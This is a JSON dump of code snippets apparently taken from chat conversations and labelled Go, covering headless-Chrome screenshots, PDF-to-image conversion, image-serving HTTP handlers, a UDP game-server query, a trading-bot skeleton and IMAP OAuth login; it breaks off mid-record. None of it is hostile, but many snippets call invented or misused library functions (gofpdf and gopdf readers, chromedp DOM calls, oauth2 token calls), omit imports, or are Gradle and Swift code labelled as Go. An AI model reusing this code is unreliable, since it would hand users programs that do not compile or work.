    "code": "package main\n\nimport (\n    \"context\"\n    \"github.com/chromedp/chromedp\"\n    \"io/ioutil\"\n    \"log\"\n)\n\nfunc main() {\n    // 加载本地HTML文件\n    html, err := ioutil.ReadFile(\"example.html\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 创建一个新的Chrome实例并连接到它\n    ctx, cancel := chromedp.NewContext(context.Background())\n    defer cancel()\n\n    // 通过导航到数据URL来加载HTML\n    var buf []byte\n    err = chromedp.Run(ctx, chromedp.Tasks{\n        chromedp.Navigate(\"data:text/html,\" + string(html)),\n        chromedp.WaitVisible(\"body\", chromedp.ByQuery),\n        chromedp.Screenshot(\"body\", &buf, chromedp.NodeVisible, chromedp.ByQuery),\n    })\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 将截图写入文件\n    err = ioutil.WriteFile(\"example.png\", buf, 0644)\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "8a0ea8d1c5c33accd99cc53a9b5ec608_0.go"
  },
  {
    "conversation_hash": "8a0ea8d1c5c33accd99cc53a9b5ec608",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"io/ioutil\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    // 加载本地HTML文件并转换为字符串\n    html, err := ioutil.ReadFile(\"example.html\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    htmlStr := string(html)\n\n    // 创建一个新的Chrome实例并连接到它\n    cmd := exec.Command(\"google-chrome-headless\", \"--disable-gpu\", \"--screenshot=example.png\")\n    stdin, err := cmd.StdinPipe()\n    if err != nil {\n        log.Fatal(err)\n    }\n    err = cmd.Start()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 向Chrome发送HTML文件内容并关闭输入流\n    _, err = stdin.Write([]byte(htmlStr))\n    if err != nil {\n        log.Fatal(err)\n    }\n    err = stdin.Close()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 等待Chrome截图完成\n    err = cmd.Wait()\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "8a0ea8d1c5c33accd99cc53a9b5ec608_1.go"
  },
  {
    "conversation_hash": "8a0ea8d1c5c33accd99cc53a9b5ec608",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"io/ioutil\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    // 加载本地HTML文件并转换为字符串\n    html, err := ioutil.ReadFile(\"/app/example.html\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    htmlStr := string(html)\n\n    // 创建一个新的Chrome实例并连接到它\n    cmd := exec.Command(\"chromium-browser\", \"--headless\", \"--disable-gpu\", \"--screenshot=/app/example.png\")\n    stdin, err := cmd.StdinPipe()\n    if err != nil {\n        log.Fatal(err)\n    }\n    err = cmd.Start()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 向Chrome发送HTML文件内容并关闭输入流\n    _, err = stdin.Write([]byte(htmlStr))\n    if err != nil {\n        log.Fatal(err)\n    }\n    err = stdin.Close()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 等待Chrome截图完成\n    err = cmd.Wait()\n    if err != nil {\n        log.Fatal(err)\n    }\n}",
    "filename": "8a0ea8d1c5c33accd99cc53a9b5ec608_4.go"
  },
  {
    "conversation_hash": "83d1f16a57bd98ccd10f26a3808b7e05",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "jar {\n    manifest {\n        attributes(\n            mainClass: 'com.mycompany.MainClass'\n        )\n    }\n}",
    "filename": "83d1f16a57bd98ccd10f26a3808b7e05_2.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "cmd := exec.Command(\"curl\", \"-X\", \"GET\", \"https://jsonplaceholder.typicode.com/posts/1\")\n    out, err := cmd.Output()\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    var res struct {\n        UserId int `json:\"userId\"`\n        Id     int `json:\"id\"`\n        Title  string `json:\"title\"`\n        Body   string `json:\"body\"`\n    }\n    json.Unmarshal(out, &res)",
    "filename": "71d967277d7eaf45c6dba01312782052_0.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "req, err := http.NewRequest(\"GET\", \"https://jsonplaceholder.typicode.com/posts/1\", nil)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    client := &http.Client{}\n    resp, err := client.Do(req)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer resp.Body.Close()\n\n    var res struct {\n        UserId int `json:\"userId\"`\n        Id     int `json:\"id\"`\n        Title  string `json:\"title\"`\n        Body   string `json:\"body\"`\n    }\n    json.NewDecoder(resp.Body).Decode(&res)",
    "filename": "71d967277d7eaf45c6dba01312782052_1.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"io/ioutil\"\n    \"log\"\n    \"os\"\n    \"os/exec\"\n    \"path/filepath\"\n    \"strconv\"\n    \"strings\"\n    \"time\"\n\n    \"github.com/chromedp/cdproto/cdp\"\n    \"github.com/chromedp/cdproto/emulation\"\n    \"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n    // 读取本地 HTML 文件\n    path := \"./index.html\"\n    data, err := ioutil.ReadFile(path)\n    if err != nil {\n        log.Fatalf(\"Failed to read file: %v\", err)\n    }\n    content := string(data)\n\n    // 启动 Chrome 浏览器及 Puppeteer 工具\n    ctx, cancel := chromedp.NewContext(context.Background())\n    defer cancel()\n    if err := chromedp.Run(ctx); err != nil {\n        log.Fatalf(\"Failed to start Chrome: %v\", err)\n    }\n\n    // 设置浏览器窗口大小和 DPI\n    var buf []byte\n    if err := chromedp.Run(ctx,\n        emulation.SetDeviceMetricsOverride(1920, 1080, 1.0, false),\n        emulation.SetCPUThrottlingRate(4),\n        chromedp.Navigate(\"http://localhost/\"), // 打开本地 HTML 文件\n        chromedp.Sleep(2 * time.Second), // 等待界面加载完成\n        chromedp.ActionFunc(func(ctx context.Context) error {\n            // 获取网页内容并创建 Screenshot\n            nodes, err := dom.getDocument().Do(ctx)\n            if err != nil {\n                return err\n            }\n            content, err = dom.getOuterHTML(nodes.NodeID).Do(ctx)\n            if err != nil {\n                return err\n            }\n            buf, err = page.CaptureScreenshot().WithQuality(90).WithClip(&cdp.Rect{X: 0, Y: 0, Width: 1920, Height: 1080}).Do(ctx)\n            if err != nil {\n                return err\n            }\n            return nil\n        }),\n    ); err != nil {\n        log.Fatalf(\"Failed to capture screenshot: %v\", err)\n    }\n\n    // 保存 screenshot\n    err = ioutil.WriteFile(filepath.Join(\".\", \"screenshot.png\"), buf, 0644)\n    if err != nil {\n        log.Fatalf(\"Failed to save screenshot: %v\", err)\n    }\n\n    log.Print(\"Screenshot saved successfully\")\n}",
    "filename": "71d967277d7eaf45c6dba01312782052_2.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"image/png\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"github.com/signintech/gopdf/pdf\"\n)\n\nfunc main() {\n\t// 读取pdf文件\n\tf, err := os.Open(\"./example.pdf\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer f.Close()\n\n\t// 解析pdf文件\n\tdoc, err := pdf.Read(f)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 将每页PDF转换为PNG图片\n\tfor i, page := range doc.Pages {\n\t\timg, err := page.ToImage()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to convert page %d: %v\", i+1, err)\n\t\t\tcontinue\n\t\t}\n\n\t\t// 保存PNG图片\n\t\tvar buf bytes.Buffer\n\t\terr = png.Encode(&buf, img)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to encode page %d: %v\", i+1, err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilename := fmt.Sprintf(\"page-%d.png\", i+1)\n\t\terr = os.WriteFile(filepath.Join(\".\", filename), buf.Bytes(), 0644)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to write file %s: %v\", filename, err)\n\t\t\tcontinue\n\t\t}\n\t\tlog.Printf(\"Page %d saved as %s\", i+1, filename)\n\t}\n}",
    "filename": "71d967277d7eaf45c6dba01312782052_4.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "pdfReader := gofpdf.NewImportReader()\nerr = pdfReader.Load(\"./example.pdf\")\nif err != nil {\n    log.Fatal(err)\n}\npdfArray := pdfReader.ImportList()",
    "filename": "71d967277d7eaf45c6dba01312782052_6.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "for pageNum, pdfPage := range pdfArray {\n\n    //设置pdf页面为当前页面\n    pdfReader.SetPage(pdfPage)\n\n    //将pdf页面渲染为image.Image\n    img := pdfReader.Image()\n\n    //将image.Image转换为PNG图片并保存\n    var buf bytes.Buffer\n    err = png.Encode(&buf, img)\n    if err != nil {\n        log.Printf(\"Failed to convert page %d: %v\", pageNum+1, err)\n        continue\n    }\n\n    filename := fmt.Sprintf(\"page-%d.png\", pageNum+1)\n    err = os.WriteFile(filepath.Join(\".\", filename), buf.Bytes(), 0644)\n    if err != nil {\n        log.Printf(\"Failed to write file %s: %v\", filename, err)\n        continue\n    }\n    log.Printf(\"Page %d saved as %s\", pageNum+1, filename)\n}",
    "filename": "71d967277d7eaf45c6dba01312782052_7.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"image/png\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"github.com/jung-kurt/gofpdf\"\n)\n\nfunc main() {\n\t// 创建一个新的 pdfReader 并加载 pdf 文件。\n\tpdfReader := gofpdf.NewImportReader()\n\terr := pdfReader.Load(\"./example.pdf\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 获取 pdfReader 中的 ImportList。\n\tpdfArray := pdfReader.ImportList()\n\n\t// 遍历 ImportList 中的每一页 pdf。\n\tfor pageNum, pdfPage := range pdfArray {\n\t\t// 将 pdfReader 的当前页指向当前的 pdfPage。\n\t\tpdfReader.SetPage(pdfPage)\n\n\t\t// 将当前页的 pdf 渲染为 image.Image。\n\t\timg := pdfReader.Image()\n\n\t\t// 将 image.Image 转换为 PNG 图片并保存。\n\t\tvar buf bytes.Buffer\n\t\terr = png.Encode(&buf, img)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to convert page %d: %v\", pageNum+1, err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilename := fmt.Sprintf(\"page-%d.png\", pageNum+1)\n\t\terr = os.WriteFile(filepath.Join(\".\", filename), buf.Bytes(), 0644)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to write file %s: %v\", filename, err)\n\t\t\tcontinue\n\t\t}\n\t\tlog.Printf(\"Page %d saved as %s\", pageNum+1, filename)\n\t}\n}",
    "filename": "71d967277d7eaf45c6dba01312782052_8.go"
  },
  {
    "conversation_hash": "71d967277d7eaf45c6dba01312782052",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "if err := chromedp.Run(ctx,\n        emulation.SetDeviceMetricsOverride(1920, 1080, 1.0, false), // 设置屏幕大小为 1920x1080。\n        chromedp.Navigate(url),\n        chromedp.Sleep(2 * time.Second),\n        chromedp.ActionFunc(func(ctx context.Context) error {\n            buf, err := page.CaptureScreenshot().WithQuality(90).WithClip(&cdp.Rect{X: 0, Y: 0, Width: 1920, Height: 1080}).Do(ctx)\n            if err != nil {\n                return err\n            }\n            // ...\n        }),\n    ); err != nil {\n        log.Fatal(err)\n}",
    "filename": "71d967277d7eaf45c6dba01312782052_14.go"
  },
  {
    "conversation_hash": "ad7fa3122cd2553cf798858fddbce91f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type MyImage struct {\n    ID      int64  `xorm:\"pk autoincr\"`\n    Name    string `xorm:\"varchar(255)\"`\n    Content []byte `xorm:\"blob\"`\n}\n\n// 存储图片\nimg := MyImage{Name: \"test.png\", Content: imageBytes}\n_, err := engine.Insert(&img)\n\n// 获取图片\nvar img MyImage\nhas, err := engine.Where(\"id = ?\", 1).Get(&img)\nif has {\n    // img.Content即为图片的byte数组\n}",
    "filename": "ad7fa3122cd2553cf798858fddbce91f_0.go"
  },
  {
    "conversation_hash": "ad7fa3122cd2553cf798858fddbce91f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"os\"\n    \"io/ioutil\"\n)\n\nfunc createImage() error {\n    // 创建目录\n    err := os.MkdirAll(\"./images\", os.ModePerm)\n    if err != nil {\n        return err\n    }\n\n    // 创建图片文件\n    file, err := os.Create(\"./images/test.png\")\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    // 写入图片内容\n    imageBytes := []byte{ /* 图片内容 */ }\n    _, err = file.Write(imageBytes)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}",
    "filename": "ad7fa3122cd2553cf798858fddbce91f_1.go"
  },
  {
    "conversation_hash": "96de33170f682bd5191c388230531214",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func getImage(w http.ResponseWriter, r *http.Request) {\n\n    //读取图片\n    f, err := os.Open(\"./test.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    defer f.Close()\n\n    //将图片转换为[]byte\n    picData, err := ioutil.ReadAll(f)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    //将图片数据以[]byte形式返回，指定Content-Type\n    w.Header().Set(\"Content-Type\", \"image/jpeg\")\n    w.Write(picData)\n\n}",
    "filename": "96de33170f682bd5191c388230531214_2.go"
  },
  {
    "conversation_hash": "96de33170f682bd5191c388230531214",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "type MyImage struct {\n    Name    string `json:\"name\"`\n    Content []byte `json:\"content\"`\n}\n\ntype Data struct {\n    Images []MyImage `json:\"images\"`\n}\n\nfunc getImage(w http.ResponseWriter, r *http.Request) {\n\n    images := []MyImage{}\n\n    //读取图片\n    f1, err := os.Open(\"./test1.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    defer f1.Close()\n\n    //将图片转换为[]byte\n    picData1, err := ioutil.ReadAll(f1)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    images = append(images, MyImage{\n        Name:    \"test1.jpg\",\n        Content: picData1,\n    })\n\n    f2, err := os.Open(\"./test2.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    defer f2.Close()\n\n    picData2, err := ioutil.ReadAll(f2)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    images = append(images, MyImage{\n        Name:    \"test2.jpg\",\n        Content: picData2,\n    })\n\n    data := Data{Images: images}\n\n    //将图片数据以[]byte形式返回\n    jsonData, err := json.Marshal(data)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    //设置Content-Type\n    w.Header().Set(\"Content-Type\", \"application/json\")\n    w.Write(jsonData)\n\n}",
    "filename": "96de33170f682bd5191c388230531214_4.go"
  },
  {
    "conversation_hash": "96de33170f682bd5191c388230531214",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "func getImage(w http.ResponseWriter, r *http.Request) {\n    f, err := os.Open(\"./test.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer f.Close()\n\n    // 将图片转换为[]byte\n    imgByte, err := ioutil.ReadAll(f)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 设置Content-Type，以确保浏览器能够正确解析图片\n    w.Header().Set(\"Content-Type\", \"image/jpeg\")\n\n    // 返回图片数据\n    w.Write(imgByte)\n}",
    "filename": "96de33170f682bd5191c388230531214_7.go"
  },
  {
    "conversation_hash": "96de33170f682bd5191c388230531214",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func getImage(w http.ResponseWriter, r *http.Request) {\n\n    //读取图片\n    f, err := os.Open(\"./test.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    defer f.Close()\n\n    //将图片转换为[]byte\n    picData, err := ioutil.ReadAll(f)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 设置Content-Type，以确保浏览器能够正确解析图片\n    w.Header().Set(\"Content-Type\", \"image/jpeg\")\n\n    // 返回图片数据\n    w.Write(picData)\n\n}",
    "filename": "96de33170f682bd5191c388230531214_9.go"
  },
  {
    "conversation_hash": "96de33170f682bd5191c388230531214",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func getImage(w http.ResponseWriter, r *http.Request) {\n\n    //读取图片\n    f, err := os.Open(\"./test.jpg\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    defer f.Close()\n\n    //将图片转换为[]byte\n    picData, err := ioutil.ReadAll(f)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // 将图片数据编码为base64字符串\n    encoded := base64.StdEncoding.EncodeToString(picData)\n\n    // 构造base64编码的图片URL\n    picURL := \"data:image/jpeg;base64,\" + encoded\n\n    // 设置响应头，以确保浏览器能够正确解析图片\n    w.Header().Set(\"Content-Type\", \"image/jpeg\")\n\n    // 将图片URL以JSON格式返回给前端\n    json.NewEncoder(w).Encode(map[string]string{\"imageUrl\": picURL})\n\n}",
    "filename": "96de33170f682bd5191c388230531214_10.go"
  },
  {
    "conversation_hash": "82e8ecd1671bbdab95a6cdaaac4e27da",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"time\"\n)",
    "filename": "82e8ecd1671bbdab95a6cdaaac4e27da_0.go"
  },
  {
    "conversation_hash": "82e8ecd1671bbdab95a6cdaaac4e27da",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type APIClient struct {\n\tBaseURL   string\n\tAPIKey    string\n\tSecretKey string\n\tclient    *http.Client\n}\n\nfunc NewAPIClient(baseURL, apiKey, secretKey string) *APIClient {\n\treturn &APIClient{\n\t\tBaseURL:   baseURL,\n\t\tAPIKey:    apiKey,\n\t\tSecretKey: secretKey,\n\t\tclient:    &http.Client{},\n\t}\n}\n\nfunc (api *APIClient) GetBalance() error {\n\t// Implement balance fetching using API\n\treturn nil\n}\n\nfunc (api *APIClient) GetMarketData() error {\n\t// Implement market data fetching using API\n\treturn nil\n}\n\nfunc (api *APIClient) PlaceOrder() error {\n\t// Implement order placement using API\n\treturn nil\n}",
    "filename": "82e8ecd1671bbdab95a6cdaaac4e27da_1.go"
  },
  {
    "conversation_hash": "82e8ecd1671bbdab95a6cdaaac4e27da",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\tapiClient := NewAPIClient(\"https://api.example.com\", \"your_api_key\", \"your_secret_key\")\n\n\tinterval := time.Minute * 5\n\n\tfor {\n\t\tmarketData, err := apiClient.GetMarketData()\n\t\tif err != nil {\n\t\t\tlog.Println(\"Failed to get market data:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tsignal, err := calculateSignal(marketData)\n\t\tif err != nil {\n\t\t\tlog.Println(\"Failed to calculate signal:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tswitch signal {\n\t\tcase \"buy\":\n\t\t\tlog.Println(\"Buy signal\")\n\t\t\tapiClient.PlaceOrder() // Add appropriate parameters\n\t\tcase \"sell\":\n\t\t\tlog.Println(\"Sell signal\")\n\t\t\tapiClient.PlaceOrder() // Add appropriate parameters\n\t\tcase \"hold\":\n\t\t\tlog.Println(\"Hold signal\")\n\t\t}\n\n\t\ttime.Sleep(interval)\n\t}\n}",
    "filename": "82e8ecd1671bbdab95a6cdaaac4e27da_3.go"
  },
  {
    "conversation_hash": "25e2209fbc634417c3c5b4cfb059d143",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"net\"\n    \"strings\"\n)\n\nfunc main() {\n    serverAddr, err := net.ResolveUDPAddr(\"udp\", \"127.0.0.1:12203\")\n    if err != nil {\n        fmt.Printf(\"Error while resolving UDP address: %v\", err)\n        return\n    }\n\n    conn, err := net.DialUDP(\"udp\", nil, serverAddr)\n    if err != nil {\n        fmt.Printf(\"Error while dialing UDP endpoint: %v\", err)\n        return\n    }\n    defer conn.Close()\n\n    query := []byte(\"\\xFF\\xFF\\xFF\\xFF\\x02getstatus\")\n    _, err = conn.Write(query)\n    if err != nil {\n        fmt.Printf(\"Error while writing to UDP endpoint: %v\", err)\n        return\n    }\n\n    // Set timeout for the connection to 3 seconds\n    conn.SetReadDeadline(time.Now().Add(3 * time.Second))\n\n    // Read response\n    data := make([]byte, 4096)\n    n, _, err := bufio.NewReader(conn).ReadFromUDP(data)\n    if err != nil {\n        fmt.Printf(\"Error while reading response: %v\", err)\n        return\n    }\n    data = data[:n]\n\n    if n < 0 {\n        fmt.Println(\"offline!\")\n        return\n    }\n\n    // Parse response\n    response := string(data[:])\n    lines := strings.Split(response, \"\\n\")\n\n    info := make(map[string]string)\n    players := make([]map[string]string, 0)\n\n    for _, line := range lines {\n        if line == \"\" {\n            continue\n        }\n\n        parts := strings.Split(line, \"\\\\\")\n        for i := 0; i < len(parts); i += 2 {\n            key := strings.ToLower(parse(parts[i], \"1\"))\n            value := parse(parts[i+1], \"1\")\n            info[key] = value\n        }\n    }\n\n    pattern := \"(.*) \\\"(.*)\\\"\"\n    for i := 2; i < len(lines); i++ {\n        line := lines[i]\n        if line == \"\" {\n            continue\n        }\n\n        parts := strings.Split(line, \" \")\n        player := make(map[string]string)\n\n        for _, part := range parts {\n            match := regexp.MustCompile(pattern).FindStringSubmatch(part)\n            if len(match) < 3 {\n                continue\n            }\n\n            key := strings.ToLower(match[1])\n            value := strings.Trim(match[2], \"\\\"\")\n            player[key] = value\n        }\n\n        players = append(players, player)\n    }\n\n    onlinePlayers := len(players)\n    if onlinePlayers > 0 {\n        for id, player := range players {\n            fmt.Printf(\"ID: %d Name: %s Ping: %s\\n\", id, player[\"name\"], player[\"ping\"])\n        }\n    }\n\n    result := map[string]interface{}{\n        \"info\":          info,\n        \"players\":       players,\n        \"onlinePlayers\": onlinePlayers,\n    }\n\n    b, err := json.Marshal(result)\n    if err != nil {\n        fmt.Printf(\"Error while marshalling result to JSON: %v\", err)\n        return\n    }\n\n    fmt.Printf(\"Result: %s\\n\", b)\n}\n\nfunc parse(str string, typ string) string {\n    switch typ {\n    case \"1\":\n        str = regexp.MustCompile(`\\^x...`).ReplaceAllString(str, \"\")\n        str = regexp.MustCompile(`\\^.`).ReplaceAllString(str, \"\")\n\n        for i := 0; i < len(str); i++ {\n            char := str[i]\n            code := int(char)\n\n            if code > 160 {\n                code -= 128\n            }\n\n            if code > 126 {\n                code = 46\n            }\n\n            if code == 16 {\n                code = 91\n            }\n\n            if code == 17 {\n                code = 93\n            }\n\n            if code < 32 {\n                code = 46\n            }\n\n            str = str[:i] + string(code) + str[i+1:]\n        }\n\n    case \"2\":\n        str = regexp.MustCompile(`\\^[\\x20-\\x7E]`).ReplaceAllString(str, \"\")\n    }\n\n    return str\n}",
    "filename": "25e2209fbc634417c3c5b4cfb059d143_0.go"
  },
  {
    "conversation_hash": "7dc4c98cc22e4ebe3efd785074340d28",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "override func viewDidLoad() {\n    super.viewDidLoad()\n    \n    // Настройка таблицы\n    tableView.dataSource = self\n    tableView.delegate = self\n    tableView.register(UITableViewCell.self, forCellReuseIdentifier: \"cell\")\n}",
    "filename": "7dc4c98cc22e4ebe3efd785074340d28_2.go"
  },
  {
    "conversation_hash": "66840a118b92923725f27f26ed4730ac",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "phone"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\t\"regexp\"\n)\n\nfunc main() {\n\tvar rawPhoneNumber string\n\n\tfmt.Print(\"Enter phone number: \")\n\tfmt.Scanln(&rawPhoneNumber)\n\n\t// Remove all non-digit characters from phone number\n\treg, err := regexp.Compile(\"[^0-9]+\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tcleaned := reg.ReplaceAllString(rawPhoneNumber, \"\")\n\t\n\tif isInternationalFormat(cleaned) {\n\t\tfmt.Println(rawPhoneNumber, \"is in international Romanian format\")\n\t} else if isNationalFormat(cleaned) {\n\t\tfmt.Println(rawPhoneNumber, \"is in national format. Reformating it to international Romanian format...\")\n\t\tinternationalFormat := reformatToInternationalFormat(cleaned)\n\t\tfmt.Println(\"International Romanian format: \", internationalFormat)\n\t} else {\n\t\tfmt.Println(\"The phone number entered is not valid\")\n\t}\n}\n\nfunc isInternationalFormat(phoneNumber string) bool {\n\tif strings.HasPrefix(phoneNumber, \"+40\") && len(phoneNumber) == 13 {\n\t\treturn true\n\t}\n\treturn false\n}\n\nfunc isNationalFormat(phoneNumber string) bool {\n\tif strings.HasPrefix(phoneNumber, \"0\") && len(phoneNumber) == 10 {\n\t\treturn true\n\t}\n\treturn false\n}\n\nfunc reformatToInternationalFormat(phoneNumber string) string {\n\tnationalCode := strings.TrimPrefix(phoneNumber, \"0\")\n\tinternationalCode := \"+40\" + nationalCode\n\treturn internationalCode\n}",
    "filename": "66840a118b92923725f27f26ed4730ac_0.go"
  },
  {
    "conversation_hash": "9f91df328d3352b11e5ca16b1586e065",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "defaultConfig {\n   ...\n   minSdkVersion XX\n   targetSdkVersion XX\n   ...\n}",
    "filename": "9f91df328d3352b11e5ca16b1586e065_0.go"
  },
  {
    "conversation_hash": "6f62da88715b2c44cd9e33634583cb24",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "dependencies {\n  implementation \"com.google.dagger:hilt-android:X.Y.Z\"\n  kapt \"com.google.dagger:hilt-android-compiler:X.Y.Z\"\n}\n\nplugins {\n    id 'dagger.hilt.android.plugin'\n}\n\nandroid {\n    compileOptions {\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n\n    kotlinOptions {\n        jvmTarget = '1.8'\n    }\n}",
    "filename": "6f62da88715b2c44cd9e33634583cb24_7.go"
  },
  {
    "conversation_hash": "dd3587445d691cdb02c65b156756cf71",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "output, err := cmd.CombinedOutput()\nif err != nil {\n    fmt.Println(err)\n    fmt.Println(string(output))\n}",
    "filename": "dd3587445d691cdb02c65b156756cf71_8.go"
  },
  {
    "conversation_hash": "3cfa077230b2b9ce5ca7f5529d54869f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        externalNativeBuild {\n            cmake {\n                cppFlags \"\"\n                abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'\n            }\n        }\n    }\n\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\"\n        }\n    }\n}",
    "filename": "3cfa077230b2b9ce5ca7f5529d54869f_3.go"
  },
  {
    "conversation_hash": "b3fb6081b1ce7a8e5cbe4175c2dfcf55",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"log\"\n\n    \"github.com/emersion/go-imap\"\n    \"github.com/emersion/go-imap/client\"\n    \"github.com/emersion/go-sasl\"\n    \"golang.org/x/oauth2\"\n)\n\nconst (\n    mailServer      = \"outlook.office365.com:993\"\n    oauthEndpoint   = \"https://login.microsoftonline.com/{DIRECTORY_(tenant)_ID}/oauth2/v2.0/token\"\n    tenantID        = \"YOUR_TENANT_ID\"\n    clientID        = \"YOUR_CLIENT_ID\"\n    clientSecret    = \"YOUR_CLIENT_SECRET\"\n    userPrincipal   = \"YOUR_USER_PRINCIPAL\"\n    delegatedUserID = \"YOUR_DELEGATED_USER_ID\"\n)\n\nfunc getOAuthToken() (*oauth2.Token, error) {\n    ctx := context.Background()\n    conf := &oauth2.Config{\n        ClientID:     clientID,\n        ClientSecret: clientSecret,\n        Endpoint: oauth2.Endpoint{\n            TokenURL: oauthEndpoint,\n        },\n        Scopes: []string{\"https://outlook.office.com/IMAP.AccessAsUser.All\"},\n    }\n\n    return conf.PasswordCredentialsToken(ctx, userPrincipal)\n}\n\nfunc main() {\n    // Get an OAuth token\n    token, err := getOAuthToken()\n    if err != nil {\n        log.Fatalf(\"Failed to get OAuth token: %v\", err)\n    }\n\n    // Set up OAuth SASL-based authentication\n    saslClient := sasl.NewOAuthBearer(token.AccessToken)\n\n    // Connect to the IMAP server\n    c, err := client.DialTLS(mailServer, nil)\n    if err != nil {\n        log.Fatalf(\"Failed to connect: %v\", err)\n    }\n    defer c.Logout()\n\n    // Authenticate the connection using our OAuth SASL client\n    if err := c.Auth(saslClient); err != nil {\n        log.Fatalf(\"Failed to authenticate: %v\", err)\n    }\n\n    // Now that we're authenticated, we can use the IMAP client as usual\n\n    // List mailboxes\n    mailboxes := make(chan *imap.MailboxInfo, 10)\n    done := make(chan error, 1)\n    go func() {\n        done <- c.List(\"\", \"*\", mailboxes)\n    }()\n\n    